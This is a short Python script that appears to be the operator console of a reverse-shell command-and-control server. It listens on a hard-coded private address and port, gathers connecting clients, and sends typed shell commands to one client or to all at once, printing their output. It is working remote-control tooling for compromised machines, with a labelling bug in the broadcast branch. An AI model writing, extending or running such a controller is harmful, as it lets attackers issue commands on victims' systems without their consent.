import socket, sys, time, threading
from termcolor import colored
import os
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
import select

clients=[]

def client_handler():
    global clients
    while True:
        curr = int(input(f"Please specify client ~ range(0 - {len(clients)-1}) - (Enter -1 to send command to all clients at once): "))
        command = str(input(f"Enter Instruction: "))
        if curr == -1:
            for conn, adrress in clients:
                i = 0;conn.send((command+"\n").encode())
                conn.settimeout(1)
                try:
                    reply = conn.recv(4096)
                    print(f"\n\t\t ---------------------- Client [{clients[curr][1][0]}] : [{clients[curr][1][1]}]'s Output --------------------------------\n\n")
                    print(colored(reply.decode(), 'green')); i+=1
                except socket.timeout:
                    continue
        else:
            clients[curr][0].send((command+"\n").encode())
            clients[curr][0].settimeout(1)
            try:
                reply = clients[curr][0].recv(4096)
                print(f"\n\t\t ---------------------- Client [{clients[curr][1][0]}] : [{clients[curr][1][1]}]'s Output --------------------------------\n\n")
                print(colored(reply.decode(), 'green'))
            except socket.timeout:
                continue
                
def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen()
    print(f"[+] - Server Listening on Port [{ip}] : [{port}]")
    thread = threading.Thread(target = client_handler).start()
    ans = ''
    while True:
        (conn,address) = s.accept()
        print(f"\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]")
        clients.append((conn, address))
        
listen("192.168.0.144",4455)

